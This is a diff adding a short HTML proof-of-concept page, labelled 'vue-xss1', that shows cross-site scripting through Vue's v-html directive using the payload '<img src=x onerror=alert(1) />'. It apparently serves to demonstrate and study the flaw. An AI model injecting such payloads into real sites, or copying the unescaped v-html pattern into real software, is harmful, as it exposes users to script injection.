@@ -1,0 +1,28 @@
+<html>
+<head>
+
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/vue/2.5.16/vue.min.js"></script>
+
+</head>
+<body>
+
+	<!-- 
+		PoC: ./vue-xss1.html
+	-->
+
+	<div id="app">
+		<!-- v-html is vulnerable. -->
+		<span v-html="userinput"></span>
+	</div>
+	
+	<script>
+		var app = new Vue({
+			el: "#app",
+			data: {
+				userinput: "<img src=x onerror=alert(1) />"
+			}
+		})
+	</script>
+	
+</body>
+</html>
